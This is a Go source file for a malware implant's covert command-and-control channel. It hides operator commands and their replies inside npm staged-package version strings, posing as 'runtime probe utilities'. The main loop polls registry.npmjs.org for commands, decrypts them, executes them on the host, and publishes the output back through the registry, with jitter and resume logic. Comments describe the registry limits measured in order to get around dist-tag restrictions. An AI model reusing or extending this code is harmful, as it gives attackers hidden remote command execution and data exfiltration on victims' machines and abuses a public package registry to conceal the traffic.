package main

// Staging transport: the channel that still writes when dist-tags cannot.
//
// npm retired classic tokens and removed direct-publish from bypass-2FA
// granular tokens. Verified against registry.npmjs.org:
//
//	PUT  /-/package/<pkg>/dist-tags/<tag>   -> 403 (automation token)
//	POST /-/stage/package/<pkg>             -> 201
//
// A staged version is the carrier. Its version string is the only field the
// registry gives back to a reader, so the payload lives there.
//
//	0.0.0-<channel>.<kind>.<seq>.<payload>
//
// Semver constraints that shaped this (measured, not assumed):
//   - total version length must stay under ~250 chars (238 ok, 259 rejected)
//   - prerelease ids may only use [0-9A-Za-z.-]; underscore is rejected
//   - an all-numeric id may not have a leading zero, so the sequence is
//     prefixed with "h" and the payload uses base32 without 0/1
//
// Capacity: ~227 base32 chars = ~141 bytes per version, before compression.

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/sha1"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

const (
	stageBase    = "0.0.0"
	stageChanLen = 4
	stageSeqLen  = 6
	maxVersion   = 250
	b32Alpha     = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
	stageCmd     = "c"
	stageReply   = "r"
)

var (
	stageVersionRe = regexp.MustCompile(
		`^0\.0\.0-([a-f][0-9a-f]{3})\.h([0-9a-f]{6})\.([cr])\.([A-Z2-7]+)$`)
	stageChanRe = regexp.MustCompile(`^[a-f][0-9a-f]{3}$`)
)

// b32Encode is base32 with a semver-safe alphabet and no padding. The
// standard library's alphabet includes 0/1, which would let a payload start
// with a digit and break the leading-zero rule.
func b32Encode(raw []byte) string {
	var sb strings.Builder
	var acc uint32
	var bits uint
	for _, b := range raw {
		acc = acc<<8 | uint32(b)
		bits += 8
		for bits >= 5 {
			bits -= 5
			sb.WriteByte(b32Alpha[(acc>>bits)&31])
		}
	}
	if bits > 0 {
		sb.WriteByte(b32Alpha[(acc<<(5-bits))&31])
	}
	return sb.String()
}

func b32Decode(text string) ([]byte, error) {
	var out []byte
	var acc uint32
	var bits uint
	for i := 0; i < len(text); i++ {
		idx := strings.IndexByte(b32Alpha, text[i])
		if idx < 0 {
			return nil, fmt.Errorf("bad base32 char %q", text[i])
		}
		acc = acc<<5 | uint32(idx)
		bits += 5
		if bits >= 8 {
			bits -= 8
			out = append(out, byte(acc>>bits))
		}
	}
	return out, nil
}

func stagePayloadRoom() int {
	fixed := len(stageBase) + 1 + stageChanLen + 1 + 1 + stageSeqLen + 1 + 1 + 1
	return maxVersion - fixed
}

// makeStageVersion assembles one message into a version string.
func makeStageVersion(channel string, seq int, kind, payload string) (string, error) {
	if !stageChanRe.MatchString(channel) {
		return "", fmt.Errorf("channel must be 4 chars, start a-f: %q", channel)
	}
	if kind != stageCmd && kind != stageReply {
		return "", fmt.Errorf("kind must be c or r: %q", kind)
	}
	if len(payload) > stagePayloadRoom() {
		return "", fmt.Errorf("payload %d > room %d", len(payload), stagePayloadRoom())
	}
	return fmt.Sprintf("%s-%s.h%06x.%s.%s",
		stageBase, channel, seq&0xffffff, kind, payload), nil
}

type stageMsg struct {
	Channel string
	Seq     int
	Kind    string
	Payload string
}

func parseStageVersion(v string) (stageMsg, bool) {
	m := stageVersionRe.FindStringSubmatch(v)
	if m == nil {
		return stageMsg{}, false
	}
	seq, err := strconv.ParseInt(m[2], 16, 64)
	if err != nil {
		return stageMsg{}, false
	}
	return stageMsg{Channel: m[1], Seq: int(seq), Kind: m[3], Payload: m[4]}, true
}

// encodeStageMessage splits data across as many versions as it needs.
// Each payload is <total><index><body>, one base32 digit each, so up to 32
// parts per message and a fixed 2-char header to strip on read.
func encodeStageMessage(channel string, seq int, kind string, data []byte) ([]string, error) {
	body := data
	if len(data) > 32 {
		var buf bytes.Buffer
		zw, _ := gzip.NewWriterLevel(&buf, gzip.BestCompression)
		zw.Write(data)
		zw.Close()
		body = buf.Bytes()
	}
	enc := b32Encode(body)

	room := stagePayloadRoom() - 2
	var parts []string
	for i := 0; i < len(enc); i += room {
		end := i + room
		if end > len(enc) {
			end = len(enc)
		}
		parts = append(parts, enc[i:end])
	}
	if len(parts) == 0 {
		parts = []string{""}
	}
	if len(parts) > len(b32Alpha) {
		return nil, fmt.Errorf("%d parts exceeds %d", len(parts), len(b32Alpha))
	}
	out := make([]string, 0, len(parts))
	for i, p := range parts {
		head := string(b32Alpha[len(parts)-1]) + string(b32Alpha[i])
		v, err := makeStageVersion(channel, seq+i+1, kind, head+p)
		if err != nil {
			return nil, err
		}
		out = append(out, v)
	}
	return out, nil
}

// decodeStageMessage reassembles one message from its parts.
func decodeStageMessage(parts []stageMsg) ([]byte, error) {
	if len(parts) == 0 {
		return nil, nil
	}
	var sb strings.Builder
	for _, p := range parts {
		if len(p.Payload) < 2 {
			continue
		}
		sb.WriteString(p.Payload[2:])
	}
	raw, err := b32Decode(sb.String())
	if err != nil {
		return nil, err
	}
	if len(raw) > 2 && raw[0] == 0x1f && raw[1] == 0x8b {
		zr, err := gzip.NewReader(bytes.NewReader(raw))
		if err != nil {
			return nil, err
		}
		defer zr.Close()
		return io.ReadAll(zr)
	}
	return raw, nil
}

// stageBuildBody is the document a staged publish expects.
// Reconstructed from libnpmpublish: POST /-/stage/package/<escaped name>.
func stageBuildBody(name, version string) map[string]any {
	tb := stageTarball(name, version)
	sum := sha1Hex(tb)
	integrity := "sha512-" + b64Std(sha512Sum(tb))
	fname := fmt.Sprintf("%s-%s.tgz", name, version)

	manifest := map[string]any{
		"name":        name,
		"version":     version,
		"main":        "index.js",
		"license":     "MIT",
		"description": "runtime probe utilities",
		"_id":         name + "@" + version,
		"dist": map[string]any{
			"shasum":    sum,
			"integrity": integrity,
			"tarball":   fmt.Sprintf("https://registry.npmjs.org/%s/-/%s", name, fname),
		},
	}
	return map[string]any{
		"_id":         name,
		"name":        name,
		"description": "runtime probe utilities",
		"dist-tags":   map[string]string{"latest": version},
		"versions":    map[string]any{version: manifest},
		"_attachments": map[string]any{
			fname: map[string]any{
				"content_type": "application/octet-stream",
				"data":         b64Std(tb),
				"length":       len(tb),
			},
		},
	}
}

// stageResponse is the list the registry returns from GET /-/stage.
type stageResponse struct {
	Items []struct {
		ID          string `json:"id"`
		PackageName string `json:"packageName"`
		Version     string `json:"version"`
		Status      string `json:"status"`
		CreatedAt   string `json:"createdAt"`
	} `json:"items"`
	Total int `json:"total"`
}

// stageList fetches every staged version for a package, paginating.
func (im *implant) stageList() ([]stageMsg, error) {
	var all []stageMsg
	for page := 0; page < 20; page++ {
		path := fmt.Sprintf("/-/stage?page=%d&perPage=100", page)
		var resp stageResponse
		if err := im.getJSON(path, &resp); err != nil {
			return all, err
		}
		for _, it := range resp.Items {
			if it.PackageName != im.pkg {
				continue
			}
			if m, ok := parseStageVersion(it.Version); ok {
				all = append(all, m)
			}
		}
		if len(resp.Items) < 100 {
			break
		}
	}
	return all, nil
}

// stagePublish stages one payload as however many versions it needs.
func (im *implant) stagePublish(channel string, seq int, kind string, data []byte) error {
	versions, err := encodeStageMessage(channel, seq, kind, data)
	if err != nil {
		return err
	}
	for _, v := range versions {
		body, err := json.Marshal(stageBuildBody(im.pkg, v))
		if err != nil {
			return err
		}
		if err := im.postJSON("/-/stage/package/"+im.pkg, body); err != nil {
			return err
		}
	}
	return nil
}

// stageRead returns every complete message of one kind newer than afterSeq.
func (im *implant) stageRead(channel, kind string, afterSeq int) ([][]byte, int) {
	msgs, err := im.stageList()
	if err != nil {
		im.logf("[!] stage list: %v", err)
		return nil, afterSeq
	}
	var mine []stageMsg
	highest := afterSeq
	for _, m := range msgs {
		if m.Channel != channel || m.Kind != kind || m.Seq <= afterSeq {
			continue
		}
		mine = append(mine, m)
		if m.Seq > highest {
			highest = m.Seq
		}
	}
	if len(mine) == 0 {
		return nil, highest
	}
	// Group by the declared part count in the header.
	var out [][]byte
	var group []stageMsg
	expected := 0
	for _, m := range mine {
		if len(m.Payload) == 0 {
			continue
		}
		if expected == 0 {
			if idx := strings.IndexByte(b32Alpha, m.Payload[0]); idx >= 0 {
				expected = idx + 1
			} else {
				continue
			}
		}
		group = append(group, m)
		if len(group) == expected {
			if raw, err := decodeStageMessage(group); err == nil {
				out = append(out, raw)
			}
			group, expected = nil, 0
		}
	}
	return out, highest
}

// ------------------------------------------------------------- http helpers

// stageBaseURL is the registry origin, derived from the implant's tag URL.
func (im *implant) stageBaseURL() string {
	i := strings.Index(im.url, "/-/package/")
	if i < 0 {
		return "https://registry.npmjs.org"
	}
	return im.url[:i]
}

func (im *implant) getJSON(path string, out any) error {
	resp, err := im.request(http.MethodGet, im.stageBaseURL()+path, nil)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		return fmt.Errorf("GET %s: HTTP %d", path, resp.StatusCode)
	}
	return json.NewDecoder(resp.Body).Decode(out)
}

func (im *implant) postJSON(path string, body []byte) error {
	resp, err := im.request(http.MethodPost, im.stageBaseURL()+path, body)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 200))
		return fmt.Errorf("POST %s: HTTP %d %s", path, resp.StatusCode, string(b))
	}
	return nil
}

// ----------------------------------------------------------- tarball + hashes

func sha1Hex(b []byte) string {
	h := sha1.Sum(b)
	return hex.EncodeToString(h[:])
}

func sha512Sum(b []byte) []byte {
	h := sha512.Sum512(b)
	return h[:]
}

func b64Std(b []byte) string {
	return base64.StdEncoding.EncodeToString(b)
}

// stageTarball builds a minimal valid npm tarball so the registry accepts the
// attachments block. Its contents are never used: the version string carries
// the payload.
func stageTarball(name, version string) []byte {
	var tarBuf bytes.Buffer
	tw := tar.NewWriter(&tarBuf)

	pkgJSON := fmt.Sprintf(
		`{"name":%q,"version":%q,"main":"index.js","license":"MIT",`+
			`"description":"runtime probe utilities"}`,
		name, version)
	add := func(path string, data []byte) {
		hdr := &tar.Header{
			Name: path, Mode: 0o644, Size: int64(len(data)),
			ModTime: time.Unix(1700000000, 0),
		}
		tw.WriteHeader(hdr)
		tw.Write(data)
	}
	add("package/package.json", []byte(pkgJSON))
	add("package/index.js", []byte("module.exports = {};\n"))
	tw.Close()

	var gzBuf bytes.Buffer
	zw, _ := gzip.NewWriterLevel(&gzBuf, gzip.BestCompression)
	zw.Write(tarBuf.Bytes())
	zw.Close()
	return gzBuf.Bytes()
}

// ------------------------------------------------------------- implant loop

// runStage is the staging-channel main loop. It polls GET /-/stage for command
// messages, runs them, and stages the output back as reply messages.
func (im *implant) runStage() {
	im.logf("[*] staging channel: pkg=%s chan=%s", im.pkg, im.stageChan)
	// Two independent cursors. Replies are written by us and must not move the
	// command cursor: sharing one counter made every reply jump the implant
	// past the operator's next command.
	lastSeq := 0
	replySeq := 0
	// Resume where we left off so a restart does not re-run old commands.
	// Only trust the saved value if it is behind the newest message actually
	// present: a fresh channel or a rebuilt implant must not sit waiting for
	// sequences it will never see.
	if st, ok := im.loadStageState(stageCmd); ok {
		lastSeq = st
	}
	if st, ok := im.loadStageState(stageReply); ok {
		replySeq = st
	}
	if msgs, err := im.stageList(); err == nil {
		newest := 0
		for _, m := range msgs {
			if m.Channel == im.stageChan && m.Kind == stageCmd && m.Seq > newest {
				newest = m.Seq
			}
		}
		// Nothing to resume past: the channel was reset or this is the first
		// run. Starting from scratch is correct here, and re-running a command
		// is better than silently ignoring every future one.
		// An empty channel means nothing to resume past, whatever the file
		// says: the operator starts numbering from 1 and we must be ready.
		if newest == 0 && lastSeq > 0 {
			im.logf("[!] channel empty but state says seq %d, resetting", lastSeq)
			lastSeq = 0
		} else if newest > 0 && lastSeq > newest {
			im.logf("[!] state seq %d > newest %d, resetting", lastSeq, newest)
			lastSeq = newest - 1
		}
	}
	im.logf("[*] resuming after seq %d", lastSeq)
	for {
		msgs, newSeq := im.stageRead(im.stageChan, stageCmd, lastSeq)
		if newSeq > lastSeq {
			lastSeq = newSeq
			im.saveStageState(lastSeq, stageCmd)
		}
		for _, raw := range msgs {
			body := raw
			// The operator seals and compresses before publishing; undo both
			// here, same order the dist-tag channel uses.
			if im.key != nil {
				plain, err := openSealed(im.key, body, []byte(im.pkg))
				if err != nil {
					im.logf("[!] stage decrypt: %v", err)
					continue
				}
				body = plain
			}
			dec, err := decompressPayload(body)
			if err != nil {
				im.logf("[!] stage decompress: %v", err)
				continue
			}
			cmd := strings.TrimSpace(string(dec))
			if cmd == "" {
				continue
			}
			im.logf("[+] cmd: %s", trunc(cmd, 60))
			out := im.exec(cmd)
			if out == "" || im.token == "" {
				continue
			}
			payload := compressPayload([]byte(out))
			if im.key != nil {
				if sealed, err := seal(im.key, payload, []byte(im.pkg)); err == nil {
					payload = sealed
				} else {
					im.logf("[!] reply seal: %v", err)
					continue
				}
			}
			if err := im.stagePublish(im.stageChan, replySeq+1, stageReply,
				payload); err != nil {
				im.logf("[!] stage reply: %v", err)
			} else {
				replySeq += 40 // leaves room for multi-part replies
				im.saveStageState(replySeq, stageReply)
				im.logf("[+] reply staged at seq %d", replySeq)
			}
		}
		time.Sleep(im.interval + time.Duration(float64(im.jitter)*randFloat()))
	}
}

// stageStatePath is per-channel and per-direction: commands and replies have
// independent cursors, and one channel must not inherit another's sequence.
func (im *implant) stageStatePath(kind string) string {
	return im.stateFile + ".stage." + im.stageChan + "." + kind
}

func (im *implant) loadStageState(kind string) (int, bool) {
	b, err := os.ReadFile(im.stageStatePath(kind))
	if err != nil {
		return 0, false
	}
	n, err := strconv.Atoi(strings.TrimSpace(string(b)))
	if err != nil {
		return 0, false
	}
	return n, true
}

func (im *implant) saveStageState(seq int, kind string) {
	os.WriteFile(im.stageStatePath(kind),
		[]byte(strconv.Itoa(seq)), 0o600)
}
